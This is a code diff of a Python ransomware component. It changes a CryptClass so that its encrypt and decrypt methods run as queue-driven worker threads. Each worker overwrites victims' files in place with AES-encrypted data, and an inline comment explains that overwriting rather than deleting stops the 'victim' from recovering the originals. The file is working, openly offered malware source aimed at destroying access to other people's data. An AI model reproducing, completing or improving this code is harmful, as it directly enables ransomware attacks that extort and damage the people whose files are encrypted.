@@ -1,37 +1,48 @@
 import os
 
+
 class CryptClass():
     def __init__(self, key: str) -> None:
         self.key = key
 
-    def encrypt(self, filename: str, aes) -> None:
-        try:
-            orig_file = open(filename, "r+b")
-            data_file = orig_file.read()
-            
-            encrypted_data = aes.encrypt(data_file)
+    def encrypt(self, aes, q) -> None:
 
-            # Overwrite file with encrypted data (if we remove the file, victim can recover it later)
-            orig_file.seek(0)
-            orig_file.write(encrypted_data)
-            orig_file.truncate()
-            orig_file.close()
-            print(f"[+] File Encrypted: {filename}")
-        except Exception as e:
-            print(f"[X] File Not Encrypted: {filename} | {e}")
+        while True:
+            try:
+                filename = q.get()
+                orig_file = open(filename, "r+b")
+                data_file = orig_file.read()
 
-    def decrypt(self, filename: str, aes) -> None:
+                encrypted_data = aes.encrypt(data_file)
 
-        try:
-            encrypted_file = open(filename, "r+b")
-            encrypted_data = encrypted_file.read()
+                # Overwrite file with encrypted data (if we remove the file, victim can recover it later)
+                orig_file.seek(0)
+                orig_file.write(encrypted_data)
+                orig_file.truncate()
+                orig_file.close()
+                print(f"[+] File Encrypted: {filename}")
 
-            original_data = aes.decrypt(encrypted_data)
+            except Exception as e:
+                print(f"[X] File Not Encrypted: {filename}")
 
-            encrypted_file.seek(0)
-            encrypted_file.write(original_data)
-            encrypted_file.truncate()
-            encrypted_file.close()
-            print(f"[+] File Decrypted: {filename}")
-        except Exception as e:
-            print(f"[X] File Not Decrypted: {filename} | {e}")
+            q.task_done()
+
+    def decrypt(self, aes, q) -> None:
+
+        while True:
+            try:
+                filename = q.get()
+                encrypted_file = open(filename, "r+b")
+                encrypted_data = encrypted_file.read()
+
+                original_data = aes.decrypt(encrypted_data)
+
+                encrypted_file.seek(0)
+                encrypted_file.write(original_data)
+                encrypted_file.truncate()
+                encrypted_file.close()
+                print(f"[+] File Decrypted: {filename}")
+            except Exception as e:
+                print(f"[X] File Not Decrypted: {filename}")
+
+            q.task_done()
